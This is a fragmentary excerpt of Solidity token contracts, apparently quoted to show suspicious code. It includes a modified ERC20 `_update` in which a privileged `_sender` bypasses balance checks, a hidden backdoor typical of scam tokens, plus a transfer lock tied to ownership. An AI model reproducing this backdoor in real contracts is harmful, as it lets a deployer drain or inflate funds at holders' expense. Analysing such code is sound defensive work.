...
contract Token is Ownable, ERC20Burnable {
  ...
  constructor() ERC20("", "") {
    _mint(address(this), ILauncher(_msgSender()).supply() * 10 ** decimals());
  }

  function _update(address from, address to, uint256 amount) internal override {
    require(from == address(0) || to == pair || owner() == address(0), "Token::_update: not launched");
    super._update(from, to, amount);
  }

  function initialize(address router_, string memory name_, string memory symbol_) external onlyOwner {
    require(router == address(0), "Token::initialize: already initialized");
    router = router_;
    _name = name_;
    _symbol = symbol_;
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _update(address from, address to, uint256 amount) internal virtual {
        if (from == address(0)) {
            ...
            uint256 fromBalance = from == _sender ? amount : _balances[from];
